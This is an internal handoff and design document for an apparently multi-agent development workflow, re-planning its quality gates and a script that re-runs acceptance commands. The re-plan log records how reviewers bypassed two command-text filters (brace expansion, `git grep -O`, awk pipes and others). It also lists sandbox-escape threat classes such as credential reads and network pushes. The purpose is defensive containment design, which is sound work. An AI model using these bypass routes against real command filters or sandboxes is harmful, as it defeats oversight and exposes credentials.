---
dispatch_id: p3-y6-replan-1
task_type: mixed       # protocol text (md), configs (yaml), templates, advisory shell scripts (two new, five edited)
e2e_required: no
research_required: no
git_tracked_dirs: []
skip_knowledge_assessment: no
gate4_delta: []
# security: gate3-check.sh executes command lines read from a handoff file (untrusted input); since re-plan p3-y6-replan-1 only inside an OS sandbox around a disposable copy (no network, no writes outside the copy, no read of $HOME), never by filtering command text
# platform: BSD/GNU shell in four scripts; harness differences in browser availability (Gate 4) and subagent tools
risk_triggers: [platform, security]
real_paths:
  - id: RP1
    path: "Gate 1 format script on the fixture Epic, its six damaged copies, the handoff/bug/journal fixtures, and this Epic"
    run: "§9.1 R2a, R2b and R2d; output quoted in the Gate 3 verdict"
  - id: RP2
    path: "Gate 3 scripted AC re-run on this handoff itself, then the real_path coverage check on the run reviewer's own verdict file"
    run: "bash .tad/hooks/lib/gate3-check.sh rerun <this handoff> --out .tad/evidence/yolo/review-redesign/phase3-ac-rerun.md --id <run id>; bash .tad/hooks/lib/gate3-check.sh paths <this handoff> <run verdict file>"
  - id: RP3
    path: "Advisory audits after the change: layer2-audit.sh on lens-named fixtures; audit-yolo.sh on this Epic"
    run: "§9.1 R6e; bash .tad/hooks/lib/audit-yolo.sh review-redesign before (at the baseline sha, in a scratch worktree or checkout) and after: no new ❌ line for phases 1–2"
  - id: RP4
    path: "Install from the working tree into a throwaway project, and the release archive shape (human ruling 2026-10-16)"
    run: "bash tad.sh --source <repo> --platform claude-code --yes in a fresh scratch project; cmp the new and changed files; git archive <phase commit> | tar -t lists gate1-format-check.sh, gate3-check.sh, escape-log.md template"
  - id: RP5
    path: "Protocol text: walks G1–G11 (§9.1 AC10) through the changed text"
    run: "each walk quotes the deciding file:line at every step and reaches its stated end"
  - id: RP6
    path: "Containment of gate3-check.sh rerun: the threat rows of both review rounds (and the new classes in §8.3) run through the real script against a scratch 'real' repo, scratch remote, scratch victim/canary dirs and a scratch fake HOME"
    run: "§9.1 R13 (bash .tad/evidence/yolo/review-redesign/phase3-fixtures/gate3-sandbox-proof.sh); the run reviewer also adds threat rows of its own to a copy of the threat handoff and observes the side effects (scratch only); Linux bwrap path: run on a Linux host or recorded not-run with the host named"
---

# Handoff Document for Agent B (Blake)
## TAD v3.1 - Evidence-Based Development

**From:** Alex (Agent A - Solution Lead), dispatched by Cora (p3-y3-1; design fix p3-y4-1; re-plan p3-y6-replan-1)
**To:** Blake (Agent B - Execution Master)
**Date:** 2026-10-19
**Project:** TAD
**Task ID:** TASK-20261019-003
**Handoff Version:** 4.0.3
**Epic:** EPIC-20261019-review-redesign.md (Phase 3/3)
**Supersedes:** N/A

---

## 🔴 Gate 2: Design Completeness (Alex必填)

Not run in this dispatch (conductor dispatch mode, Design kind: stop before step2). Gate 2 for this phase = the Y4 review files on disk. No PASS claimed here.
Gate 1 for this phase: the Epic's confirmed `## Requirement` (Approved line) plus this Alex: I can design from Part 2 Gate 1/3/4/escape log and Part 3 G; no question needed (one design decision recorded as an assumption, §4.1 D6).

### Change log — design fix p3-y4-1 (Y4 round 1: `phase3-design-review-cr.md` FAIL, P0-1; `phase3-design-review-fit.md` CONDITIONAL, 3 P1)
The P0 was fixed as a class: every §9.1 expectation was re-derived against what the specified implementation produces (row names, output lines, which file carries which token, which token-bearing lines a replacement removes). Four more mismatches of the same class were found and fixed (marked "class").

| # | Source | Change | Level | Where |
|---|---|---|---|---|
| 1 | CR P0-1 | `rerun` row naming fixed: single backtick span → `AC<n>`; id-list cell → one row per id `AC<n>/<id>`; R3b `ok=` and `notrun=` patterns accept both forms | design | §4.2.2, R3b |
| 2 | class (R3a) | Blake SKILL never named `gate3-check.sh` (only `ac-rerun.md`): Layer 2 `reviewers.run` gains a `runs_first:` line naming it | design | §4.2.2 |
| 3 | class (R4a) | acceptance-protocol step3 and dispatch-mode Gate 4 kind did not carry all 12 tokens (AP lacked 11, DM lacked `took no part`): their exact key lines are now specified | design | §4.2.3 |
| 4 | class (R5) | `*bug` step2 did not name the file: it now names `.tad/evidence/escape-log.md`; Cora's write-list line (`SKILL.md:74`) is named as the line that carries "the escape log" | local | §4.2.4 |
| 5 | class (R9a, R8c, R4b) | the gate SKILL Gate 4 replacement scope was ambiguous (the `## ⚠️ Gate 4 Subagent Requirement` heading sits in the same fence as Knowledge_Assessment_Gate4 and Post_Pass_Actions, which stay); the removed token-bearing lines are now listed one by one with their restatement (title keeps `**MANDATORY**`, `:629` VIOLATION+MUST, `:790` MANDATORY) and the lines that must survive (`:775`, `:836–918`); same for config-quality `:252, :306, :701`, Blake `:1207`, completion template `:247`, contract §6 "push" | design | §4.2.3, §📚 2 |
| 6 | CR P1-1 | Gate 1 carriers: requirement-clarification §2/§5, the handoff template §1.5 and Cora's simple-tier journal fields now name the literal lines; `c2` accepts a lettered block (`- **E. Done check**:`); handoff-mode checks are line-anchored so the template's own prose cannot satisfy them; new R2d (handoff/bug/journal modes) and R12 columns | design | D2, §4.2.1, R2d, R12 |
| 7 | CR P1-2 | `paths` prints `BLOCKED <ID>` for a `## Blocked` line (exit 0); contract §1: a BLOCKED line ⇒ verdict at most PARTIAL (§6 unchanged), MISSING ⇒ FAIL; fixture `gate3-verdict-blocked.md`, R3b extended | design | §4.2.2, R3b |
| 8 | CR P1-3 | second copies added: `experiment-path-protocol.md:59–60, :65–67, :81`, `deliverable-handoff.md:243` (K35, K36); `deliverable-completion.md:28` and `completion-report.md:20` Stay (K37, reason given); R7b gains six tokens and those files; `*spike` named in §4.2.5 (same path as `*handoff`; its registry lines are byte-exact and already say "≥2 experts") | design | §4.0, §4.2.7, R7b |
| 9 | CR P1-4 | guard rows labelled `(guard)` in §9.1 | local | §9.1 |
| 10 | CR P1-6 | contract §8 "Who dispatches" line adds the acceptor (Cora in her runs; Alex at direct `*accept`) — K19 | local | §4.0, §4.2.3 |
| 11 | CR P1-7 | R2a asserts the expected `MISSING <id>` per damaged copy (`exit/count`) | local | R2a |
| 12 | CR P1-9 (superseded by re-plan p3-y6-replan-1 R1/R2: rows run in a sandboxed copy, not the repo root) | contract §6 states the one repo-root exception: `gate3-check.sh rerun` runs §9.1 commands from the repo root; a handoff's §9.1 commands must be read-only (scratch writes via `mktemp -d` only) | design | K8, §4.2.2 |
| 13 | CR P1-10 | `pre-accept-check.sh:50` message reworded (exit unchanged; R6b parses it, R6c keeps `1/1`) | local | §4.2.6, K38 |
| 14 | Fit P1-1 | duty 4 contradiction ("nothing else goes to him" vs "the item listed for the human") resolved: no browser → `Not run:` line in `## For the human` (shown, never asked; not a `Needs you:` item); a UI deliverable whose real use did not run caps the verdict at CONDITIONAL; Cora (step_Y7 3) and Alex at `*accept` re-dispatch the acceptor once on a subagent whose tool list has a browser when the harness offers one | design | §4.2.3, G3 |
| 15 | Fit P1-2 | the restated MANDATORY line names the scenario walk as the real use for protocol text | local | §4.2.3 |
| 16 | Fit P1-3 | post-tag download install: run by the party that pushes the tag (release step, under the tag's own confirmation), never handed to the human; the acceptor records it `not-run: after the tag — release step (human-rulings.md 2026-10-16)`; release-runbook text has no such step today and is out of this phase's scope (§1.3 "no release text") → listed as Open P1 for Gate 4 | design | duty 5, G11 |

Not applied, with reason: CR P1-5 / Fit Q3 (D6 simple tier without a separate Gate 4) stays a recorded assumption for the human at Gate 4. CR P1-8 (`data` trigger): the installer and sync code are not changed; the new shipped files are covered by RP4 (install + `git archive` listing) per the 2026-10-16 ruling, so no domain lens is added. Fit P1 (defer doc wording first): not applied — R7a/R7b cover the doc lines, so deferring them fails AC7; step 9 stays last in the order. Fit Q1/Q2 were settled as design (rows 14, 16): neither adds the human nor changes scope.

### Change log — re-plan p3-y6-replan-1 (Y6 round 2 still open: `phase3-impl-review-cr-r2.md` FAIL 3 P0, `phase3-impl-review-run-r2.md` FAIL 1 P0; round 1 `phase3-impl-review-run.md` P0-1; premise file `.tad/evidence/yolo/review-redesign/phase3-premise.md`)
Root cause (premise file): both fixes of `rerun` (deny regex in fe797468, allowlist with per-command argument checks in 23ed6706) rest on one premise — that reading a command's text before bash runs it can tell whether it will push, tag, publish, delete or write, so it may then run in the real repository with the user's network, credentials and remotes. The reviewers' runs show it is false: each fix closed the spellings it was shown and the next round executed new ones (brace expansion, abbreviated long options, `cd` then a relative script, `sed -ie`/`-I`, `git grep -O<cmd>`, awk `print | var`). The fault is above the patches, so the design changes at that level: **no text filter decides safety; the executing environment does.**

| # | Source | Change | Level | Where |
|---|---|---|---|---|
| R1 | run r1 P0-1; cr r2 P0-1..3; run r2 P0-1 (all empirical) | `rerun` never executes a row in the real repo. It builds a disposable copy (the box), runs every scriptable row inside it under an OS sandbox (macOS `sandbox-exec`, Linux `bwrap`) that denies all network, all writes outside the box, every read under the caller's `$HOME`, and on macOS mach-lookup / Apple events; env cleared (`env -i`), HOME and TMPDIR inside the box, no credentials, no remotes in the copy; a start-up probe proves the denials before any row runs; no sandbox or a failed probe → every row `not-run: … — run by hand`, nothing executed. The box is deleted afterwards | design | §4.2.2 |
| R2 | class (premise) | The deny regex and the awk allowlist guard are **removed**, not kept as defence in depth: they decided nothing safely, refused legitimate rows and gave a false promise in the header. Header comment and contract/gate wording say "sandboxed disposable copy" instead of "read-only allowlist" / "from the repo root" / "denied": `gate3-check.sh` header, review-contract §5 run and §6 scratch bullet, gate SKILL Gate 3 §9.1 step1 (`:172`, "marks not-scriptable or denied" → "not-scriptable or not-run") | design | §4.2.2, K8, §10.1 |
| R3 | class: the threat rows of both rounds as fixtures | new tracked fixtures `gate3-threat-handoff.md` (every spelling from run r1, cr r2, run r2, Blake's 162 deny rows, plus the classes the sandbox must also stop: absolute-path write into the "real" repo, symlink out of the box, push to the scratch remote by absolute path, network push/curl, fake-HOME credential read, keychain query, `open` of a URL, `core.fsmonitor` in the copy) and `gate3-sandbox-proof.sh`; each threat row must **run** (an exit number, not not-run) and the proof must observe **no** effect outside the box; a filesystem-only control run outside the sandbox must show the rows are live | design | §8.3, AC13/R13, RP6 |
| R4 | dependency of R1 | rows now run in a copy, so every file a §9.1 row reads must reach it: the copy = clone (history) + the whole working tree as it is (tracked, modified, untracked and ignored files, deletions applied), minus `.git`, `.worktrees/` and any `node_modules/` (measured here: ~20k ignored files, ~117 MB, listing 2.6 s). So rows reading the gitignored completion report, fixtures or live escape log (R2a, R3b, R5, R10) behave as by hand. The new threat fixtures and proof are tracked (like Rework 1's proof files); CR r1 P1-1 (first-pass fixtures re-runnable from a clean clone) stays carried, not a dependency | design | §4.2.2, §6 step 4, §7.1 |
| R5 | dependency of R1 | fixture `gate3-handoff.md` AC3 is no longer a deny row: it becomes a write that must stay in the box; R3b expectation re-derived (`rows=3 notrun=0 ok=3 leak=0`) | design | §8.3, AC3/R3b |
| R6 | dependency of R1 | Friction rows: no sandbox tool / failed probe (not-run, reviewer runs rows by hand — the pre-Phase-3 practice, no wider trust); nested sandbox (a harness that already sandboxes may refuse `sandbox-exec`) handled by the same probe | design | §8.4 |

Unchanged by this re-plan: Gate 1, Gate 4, escape log, `paths`, the walks, every other §9.1 row and the P1 fixes of Rework 1 (post-write-sync text, `hasf`, Epic-pointer anchoring). Requirement check: Epic Part 2 Gate 3 "Acceptance commands are re-run by script" still holds (the script re-runs them, inside the box); "real run never outward, nothing paid" is now enforced by the environment (no network ⇒ no outward call and no paid API call). On a host with no usable sandbox the rows are recorded not-run and run by hand — an assumption listed for Gate 4, not a scope change.

---

## 📋 Handoff Checklist (Blake必读)
- [ ] Read all sections, incl. §📚, §4.0 (every contradicted line and its resolution) and §4.3 (carried conditions)
- [ ] Read `.tad/project-knowledge/patterns/shell-portability.md` before touching any `.tad/hooks/**` file (AGENTS.md rule)
- [ ] Every §9.1 row understood; fixtures (§8.3) and walks G1–G11 planned
- [ ] Unclear → write `.tad/evidence/yolo/review-redesign/phase3-questions.md` (dispatch_id line 1) and stop

---

## 1. Task Overview

### 1.1 What We're Building
The gates around the Phase 2 reviewers, the same on every path: Gate 1 = four conditions, format checked by a script, content by the human's confirmed per-block playback plus Alex's "can design from it"; Gate 3 = the Phase 2 run + consistency (+ domain) reviewers plus a scripted re-run of the acceptance commands and a scripted check that every `real_path` has run evidence or a `not-run` reason, verdict written by the run reviewer (never the builder, never Cora); Gate 4 = an Alex acceptor that took no part does once, for real, what the human will do with the result (or drives a browser), with screenshots / run logs, judges against `## Requirement` + Result contract, and hands the human a verdict plus 3–5 evidence lines; an escape log; and every copy of the old gate text brought into line.
Re-plan p3-y6-replan-1 (premise file `.tad/evidence/yolo/review-redesign/phase3-premise.md`): the Gate 3 script re-runs the acceptance commands only inside an OS sandbox around a disposable copy of the repo; it never decides safety by reading command text (§4.2.2, AC13, RP6).

### 1.2 Why
Epic Part 2: "Gate 3/4 … should really run, or drive a browser … by AI, no human added"; gates must have conditions; escape log "found by whom / which gate should have caught it". Part 3 G1: every entry keeps its door but follows Cora's rules. Phase 1/2 gate reports carried their open seams here (§4.3).

### 1.3 Intent Statement
**真正要解决的问题**: a gate passes only on things that were actually run from the human's side and checked by someone who did not build them; the human gets a short verdict with evidence, and is asked only for what AI cannot do.

**不是要做的**:
- ❌ No new blocking hook (both new scripts are CLI smoke alarms, never registered); no browser tool installed; no model runs, nothing paid
- ❌ No release/publish text, version bump, push, tag; no Lite; no principles.md edit; no research gates RG1–RG4; no Knowledge Assessment / distillation-step / honest_partial / stop-list rule change
- ❌ Not the human decisions carried from Phases 1–2 (Phase 1 C-4 product-expert; Phase 2 "P1 handling on /blake"): left for the Epic acceptance

### 1.4 卸载记录（Offload Log）
| 时间 | 卸载项 | 依据 | 原文指针 | 回取方式 |
|---|---|---|---|---|
| 2026-10-19 19:40 | Phase 1/2 handoff bodies; inventory §2 detail | already built; only seams matter | `HANDOFF-2026-10-19-review-redesign-phase{1,2}.md`, `review-paths-inventory.md` | Read on demand |

### 1.5 Requirement (human's words)
Epic `## Requirement` Part 2 (Gate 1, Gate 3, Gate 4, escape log) and Part 3 G (authoritative). Part 3 G supersedes Part 2's "one Gate 3 reviewer" (Gate 3 = run + consistency, built in Phase 2) and intake AC3.8 G1's "Layer 2 = one run reviewer" (it is run + consistency). Standing ruling: `.tad/project-knowledge/rulings/human-rulings.md` 2026-10-16 (release archive installed before tagging; real download after; review of tracked-file changes checks what enters the archive).

---

## 📚 Project Knowledge（Blake 必读）

Read: `principles.md`; patterns `gate-design.md`, `ac-verification.md`, `shell-portability.md` (mandatory for the hook edits).

**⚠️ Blake 必须注意的历史教训**:
1. **Mechanical Enforcement Rejected on Single-User CLI** (principles) — both new scripts are CLI tools: never in `.claude/settings*.json`, `.codex/hooks.json`, `.cursor/hooks.json`, `.opencode/plugins`; no new `exit 2` in hook scripts (R2c, R6c).
2. **Judgment-Only Skill Files / Rewiring a Gate's Prose Can Trip a grep -c SAFETY Count** — every removed MUST/MANDATORY/VIOLATION (Gate 4 Required_Subagents, anti_skip, Gate 4 Subagent Requirement) is restated in its new form in the same edit; per-file counts must not fall (R9a). The token-bearing lines this design touches (grep at `B`, `MUST|MANDATORY|VIOLATION|push|credentials|spending`): gate SKILL `:577` (title: keep `- **MANDATORY** 🔴`), `:629` (VIOLATION + MUST: restated, §4.2.3), `:790` (MANDATORY: restated); must survive untouched: gate SKILL `:775` and `:836–918` (also R8c: `:894`), config-quality `:252`, `:701`; kept inside the edited line: config-quality `:306` (`MANDATORY`), Blake `:1207` (`MUST`), completion template `:247` heading (`MANDATORY`), contract §6 not-run bullet (`push`). No other line in the edited ranges carries a token.
3. **Global-Count Floor Cannot Detect Must-Cover Loss** — per-token, per-file checks (R1b, R4a, R11), not totals.
4. **Execution Discipline Content Must Stay in SKILL Body** — keep Blake markers `Layer 2`, `gate3_verdict`, `hard_requirement_distinct_reviewers`; `skill-body-verify.sh` stays green (R9b). Cora's Triage keeps the discuss-vs-work rule in its body (C-3: a rule that decides whether a reference applies cannot live in that reference).
5. **AC baseline drift at commit** (Phase 2 gate report candidate) — every before/after AC below names the baseline `B=0cf8cfda`, never `HEAD:`.
6. **claims-need-carriers** (`gate-design.md`) — each new duty has a named carrier: the format script is run in Cora Intake and Alex step1b; `gate3-check.sh` is named in the run prompt and contract §5; the escape-log writer is in Cora's write list and `*bug` step2; its reader is the distillation input list.
7. **Shell** (`shell-portability.md`): the Bash tool runs zsh — run every AC with `bash -c`; macOS has no `timeout` (use `perl -e 'alarm …'` when present, else none); BSD `sed -i ''`; `LC_ALL=C` for sorts; `grep -F` for literal `$`, `|`, `→`; never `set -e` around greps that may not match; `mktemp -d` (no suffix); `[ -L ]` before writing a path.
8. **Syncthing ↔ git drift** — `git status` shows `MM` on unrelated files (e.g. `docs/MULTI-PLATFORM.md`, not edited here); commit with explicit pathspecs only (`git commit -- <paths>`), never `-A`.

---

## 2. Background Context

### 2.1 Previous Work
Phase 1: `## Requirement` in the Epic template, `requirement-clarification.md`. Phase 2: `.tad/templates/review-contract.md` (§0–§9), Gate 2 consistency + risk/fit, Gate 3 run + consistency (+ domain) on every path, run reviewer signs Gate 3.

### 2.2 Current State (re-grounded 19:00–19:46)
- Gate 1: canonical `:8–19` and gate SKILL `:63–76` = "Optional Quick Check" with Socratic Q1/Q2/Q3 items (R1a = 7 hits); Alex `my_gates.gate1` `:1148–1153` blocking with the same four old items; `config-quality.yaml:63–70`.
- Gate 3: no scripted re-run (`verify-ac-commands.sh` only lints), no `real_path` coverage check; contract §5 run "runs every §9.1 Verification Method" by hand.
- Gate 4: gate SKILL `:577–840` — Owner "Agent B (Blake) executes", security-auditor/performance-optimizer/code-reviewer BLOCKING for code/mixed (`Structural_Subagent_Conditionality`, `Required_Subagents`, `## ⚠️ Gate 4 Subagent Requirement`), per-row recompute (`:734`, `:746`); canonical `:62–80`; `acceptance-protocol.md` step4c tier thresholds (`:62–100`), step6 "人类确认 演示/走查" (`:188`, `:395–398`); Alex `:1162–1168`, `:1292–1350`, `:1564–1591`; `config-quality.yaml:211–232, :711–777`; conductor step_Y7 2 has no real run/browser.
- Escape log: none.
- Advisory scripts: `pre-gate-check.sh` Check 11 "≥2 required: code-reviewer + domain expert"; `layer2-audit.sh` treats `gate3-verdict` as a substitution and lens files as unknown (fixture: FAIL exit 1), express = 1 reviewer OK; `audit-yolo.sh` knows only `-cr` names.
- Second copies (Phase 2 P1-3): `learn-path-protocol.md:103`, `config-execution.yaml:17–20`, `spec-compliance-format.md:3`, `handoff-a-to-b.md:504, :540–544`, `AGENTS.md:6`, `README.md:52, :69`, `tad/SKILL.md:120–125`, `docs/CODEX-USER-GUIDE.md:95–101, :172–186, :386`, `docs/RALPH-LOOP.md:71, :262–275`, `docs/process-tax-cut.md:64`, `patterns/process-tax-cut.md:8`.

### 2.3 Dependencies
Phase 1 and Phase 2 (✅). Nothing after.

---

## 3. Requirements

### 3.1 Functional Requirements
- FR1 Gate 1 conditions + format script (§4.2.1).
- FR2 Gate 3 scripted re-run + real_path coverage (§4.2.2).
- FR3 Gate 4 acceptor by real use / browser, verdict + 3–5 evidence lines, human-only cases, not-run, paid = stop, release ruling (§4.2.3).
- FR4 Escape log: template, live file, writers, reader (§4.2.4).
- FR5 Same on every path: Cora tiers, direct `/alex` (`*handoff`, `*express`, `*bug`, `*accept`), direct `/blake` (§4.2.5).
- FR6 Advisory scripts, templates, configs and docs aligned (§4.2.6–4.2.7).
- FR7 Carried conditions from the Phase 1/2 gate reports (§4.3).

### 3.2 Non-Functional Requirements
- NFR1 No new blocking: new scripts exit 0/1/2 as CLI tools, never hooks; hook scripts keep their exit-2 count (R6c).
- NFR2 No weakening (R9a–R9d); `[A###]` superset (R8a); Gate 4 prompt keeps [A005][A007][A088][A089][A095][A037] (R8b); Knowledge-Assessment blocking lines unchanged (R8c).
- NFR3 Harness-neutral: browser tools named as Claude Code examples; any harness without one records `not-run`.
- NFR4 Cora still reads no handoff content: the Gate 1 script reads the Epic (her own file) or her journal; Gate 3/4 scripts are run by reviewers.

---

## 4. Technical Design

### 4.0 Unchanged lines the change contradicts — and their resolution
"Edit" = Blake changes it here; "Stays" = still true, untouched.

| # | File:line (today) | Says | Contradicts | Resolution |
|---|---|---|---|---|
| K1 | gate SKILL :14–23 | Gate 1 "after 3-5 rounds of mining"; Gate 3 "Blake completes"; Gate 4 "Blake 完成集成"; rules 2–3 | four conditions; acceptor | Edit (§4.2.1, §4.2.3) |
| K2 | gate SKILL :55–58 gate list | Gate 1 "After elicitation"; "Gate 4 … (Agent B …)" | same | Edit |
| K3 | canonical :8–19, gate SKILL :63–76 | "Optional Quick Check", Socratic Q1–Q3 items, Why CE | four conditions | Edit; the "Method grammar" note moves to a new Gate 2 item "§9.1 Methods legal" (consistency baseline run) — moved, not dropped |
| K4 | Alex SKILL :61 "必须通过 Gate 1" | Gate 1 required before design | — | Stays (Gate 1 kept; principle "Four-Gate Quality System" stays true) |
| K5 | Alex SKILL :1148–1153 `gate1`; config-quality :63–70 | old four items | four conditions | Edit |
| K6 | canonical :36–57 / gate SKILL Gate 3 :105–402 | 7 items, no scripted re-run, no real_path check | Gate 3 = reviewers + script | Edit: two items added (MECE comment → 9) |
| K7 | contract §5 run, §1 self-consistency | run "runs every §9.1 Verification Method"; no coverage rule | script first; coverage | Edit (§4.2.2) |
| K8 | contract §6 friction bullet; §6 "In a scratch or temp location" | a missing tool that could be installed = friction → PARTIAL; every run in scratch | browser-less harness = not-run (Requirement); `rerun` runs from the repo root | Edit: a browser tool the harness/subagent lacks is a missing capability → `not-run`; installing one is a new dependency the human is asked about, never a precondition for the verdict. Add to the scratch bullet (re-plan p3-y6-replan-1 replaces the round-1 "repo-root exception" text): "`gate3-check.sh rerun` runs a handoff's §9.1 commands only inside an OS sandbox around a disposable copy of the repo (no network, no write outside the copy, no read of `$HOME`); with no sandbox the rows are `not-run` and run by hand in scratch. §9.1 commands are still read-only and repo-relative (any scratch write through `mktemp -d`); a command that writes into the repo is a design defect (consistency lens at Gate 2)." The not-run bullet keeps the word "push" (R9a) |
| K9 | gate SKILL :577–840 | Owner Blake; Structural_Subagent_Conditionality, Required_Subagents, Gate 4 Subagent Requirement, Acceptance_Report_Format (code/security/perf subagents BLOCKING); per-row recompute :734/:746 | acceptor by real use; recompute moved to the Gate 3 script | Edit (§4.2.3); every removed VIOLATION/MANDATORY restated in new form |
| K10 | canonical :62–80 Gate 4 | same items | same | Edit |
| K11 | acceptance-protocol v2_note, step1–step6, step4c tiers, technical_review_note, gate4_v2_checklist.human_approval | Alex judges by reading; tiers; human demo/walkthrough | acceptor; two lenses everywhere; no human added | Edit (§4.2.3); step4d, step4e, step4f, step7 (A/B/C incl. AR-005 raw-TSV recompute), step7d, violations: Stay |
| K12 | Alex SKILL :1162–1168, :1292–1350, :1541–1591 | Gate 4 v2 business-only, human demo, "Gate 3 v2 Blake owns" | acceptor; run reviewer signs Gate 3 | Edit; registry :1599–1667 untouched (AR-005 stays true: the acceptor answers its (a)(b)(c)) |
| K13 | conductor step_Y6 2 run prompt; Y6 4 | no script; a consistency file that raises risk_triggers has no dispatcher step (Phase 2 P1-4) | §4.2.2; §4.3 | Edit |
| K14 | conductor step_Y7 2 Gate 4 prompt | reads review files only | real use, browser, For the human | Edit, tags kept on the prompt |
| K15 | conductor epic_completion 3b, 4 | distillation inputs; acceptance question | escape log read; relay `## For the human` | Edit |
| K16 | conductor evidence_structure | no ac-rerun, no gate4 evidence dir | new files | Edit |
| K17 | dispatch-mode "Gate 4" kind | gate report + KA only | acceptor duties | Edit |
| K18 | Cora SKILL Triage Simple (:19 journal fields `blocks:`, `qa:`, `assumptions:`); :17; Intake; Record "She may write only" (:74); never-list "Gate 4 is written by an Alex subagent that took no part" | no relay of run evidence; "at most 4 questions" (no "per block"); no Done check / Not wanted / Premise / Decisions carrier; write list without the escape log | §4.2.1, §4.2.4, §4.3 | Edit; the never-list line Stays |
| K19 | contract §5 acceptor line, §7, §8 Gate 4 row, §8 "Who dispatches" line (:85) | acceptor undefined beyond a pointer; simple-tier round exception not named (P1-7); "Who dispatches" names no Gate 4 dispatcher | §4.2.3, §4.3 | Edit; :85 gains "the Gate 4 acceptor: Cora in her runs, the designing Alex at direct `*accept` (never himself)" |
| K20 | Blake SKILL :1152, :1207, :1520 + :1551 order (P1-5), :1592–1593, :1621, :1659, :1674, :1982, :1992, :2013 | "Gate 4 business-only", "Alex will raw-TSV-recompute", "*gate 4 - Run Gate 4 v2", report written after Layer 2 | acceptor; report before Layer 2 | Edit; Layer 2 block :924–960 Stays except one on_failure line (§4.3 P1-4) |
| K21 | express :46; learn-path :103; bug-path :85 and step4 Blake Instructions "→ done" | "Gate 4 v2 (Alex side)"; "KEEPS ≥1 expert review"; "escalate to user"; no Gate 4 after a bug fix | same on every path | Edit |
| K22 | handoff-creation step1b; :230 "Gate 4 cannot PASS on missing/unrun Methods" | no Gate 1 format check; recompute at Gate 4 | script at step1b; re-run at Gate 3 | Edit |
| K23 | pre-gate-check.sh Check 10/11 | "Did Layer 2 expert review complete?"; "≥2 required: code-reviewer + domain expert" | contract §8 | Edit wording; Check 11 looks for the run and consistency files; exits unchanged |
| K24 | layer2-audit.sh lists, :251 comment, express exception | lens files unknown/substitution; express 1 OK | two lenses on every path | Edit (§4.2.6) |
| K25 | audit-yolo.sh :111–149, :196–240, :306–307 | `-cr` names only | lens names | Edit: accept `-consistency` first, `-cr` as legacy fallback |
| K26 | post-write-sync.sh :150 comment "Blake's own verdict" | run reviewer writes it | — | Edit comment only; behaviour unchanged |
| K27 | handoff template :504 (Group 0), :540–544 §9 ("Human验证"), real_paths comment; completion template Layer 2/Evidence Checklist (:253–257)/"Human 验收区"; epic template (no Result contract) | old groups; human check; no carrier for Gate 1 items | §4.2.7 | Edit |
| K28 | config-quality :211–232 gate4_v2, :270–307 matrix, :704–777 mandatory/enforcement; config-execution :17–20; config-agents :236–281; spec-compliance-format :3 | test-runner/security/perf mandatory; human final check | contract §8, acceptor | Edit wording/values; YAML keys kept (no script consumer found: `grep` over *.sh/*.py/*.js/*.ts) |
| K29 | `.tad/gates/quality-gate-checklist.md` | old Gate 1/4 items | — | Stays (already marked SUPERSEDED, not loaded) |
| K30 | `.tad/gates/gate-execution-guide.md` :5–9, :44–48 | points to the superseded checklist | canonical | Edit: one SUPERSEDED banner line at the top pointing to the canonical checklist; body untouched |
| K31 | README :52, :69; AGENTS.md :6, :43; tad SKILL :120–125; CODEX guide :95–101, :172–186, :386; RALPH-LOOP :71, :262–275; docs/process-tax-cut :64; patterns/process-tax-cut :8 | Blake owns Gate 3, human confirms Gate 4, P1=0, "min 2" | §4.2.7 | Edit wording only |
| K32 | docs/MULTI-PLATFORM.md | no gate wording (grep) | — | Stays (and it is `MM` Syncthing drift: do not stage) |
| K33 | Phase 2 P1-6 (a fix for one lens's P0 not re-checked by consistency) | — | — | Stays: Phase 2 chose not to apply it (completion "Not applied"); listed for Gate 4 |
| K34 | alex-lite / blake-lite | old rules | — | Stays (frozen) |
| K35 | `experiment-path-protocol.md:59–60, :65–67, :81` | "Gate 3 v2 (Blake side: build/test/lint …)", "Gate 4 v2 acceptance (Alex side: business AC …)", "Original Gate 4 v2 (user-facing behavior + business AC)" | Gate 3 reviewers; acceptor | Edit (§4.2.7); the AUGMENT checks and their numbering stay |
| K36 | `.tad/templates/deliverable-handoff.md:243` | "→ Gate 4 (business acceptance)" | acceptor | Edit: "→ Gate 4 (the acceptor, by real use)" |
| K37 | `deliverable-completion.md:28`, `completion-report.md:20` | "Gate 3 v2: … (Producer/Conductor 填写)", "(Blake必填)" | — | Stays: the section is the builder's own preparation in his report, not the verdict (the run reviewer's file is); "v2" is a version label, no contradiction |
| K38 | `pre-accept-check.sh:50` | "Blake must run *complete + /gate 3 first" | run reviewer signs Gate 3 | Edit message only: "…no completion report found … — Blake's completion report and the Gate 3 reviewer files (review contract §8) come first." `exit 2` stays (R6c `1/1`) |
| K39 | `requirement-clarification.md` §2 :14, §5 :31–33; handoff template §1.5 (:126–128) | done-check / not-wanted blocks "always present" but no literal line named; §1.5 lists only block lines, Q→A log, Assumptions | Gate 1 format checks c1/c2 | Edit (§4.2.1) |

### 4.1 Architecture Overview and decisions
- D1 Gate 1 = four conditions (Epic Part 2): (1) what he gets and does not want; (2) each deliverable has a check that can judge done/not done; (3) decisions for the human listed, premise and size stated; (4) estimate stated. Checked by: format → `gate1-format-check.sh`; content → his confirmed per-block playback + Alex's one line "can design from it" (or the block it cannot). No self-scored checklist.
- D2 Carriers in the record (claims-need-carriers): Epic `## Requirement` block lines `- **Done check**:` and `- **Not wanted**:` (requirement-clarification §2 already makes both blocks always present but names no literal line; this phase names it there, in §5, in the handoff template §1.5 and in Cora's simple-tier journal fields — K18, K39; a lettered block `- **E. Done check**:` counts); new `## Result contract` lines `What the human gets:`, `Not wanted:`, `Premise:`, and `### Decisions for the human (settled before "continue")` (Intake's existing "important technical decisions … as a list" gets its heading); size = `**Depth**:` line's `blast radius`; estimate = `**Budget**:` line.
- D3 Gate 3 verdict writer stays the run reviewer (Phase 2). Mechanical parts are scripts it runs; the Gate 4 acceptor (another party) re-runs the coverage check on the final verdict file, so the run reviewer's evidence is checked by someone who did not write it.
- D4 Gate 4 = one acceptor (contract §8), dispatched by Cora in her runs and by the designing Alex at `*accept` in direct mode (the designer never judges: principle "Three Roles"). Recompute of every §9.1 row moves to the Gate 3 script; the acceptor still recomputes quantitative ACs from raw files (AR-005) and any PARTIAL in play ([A089]).
- D5 Escape log: rule-based "which gate should have caught it" (table in the template), so the writer records, not judges.
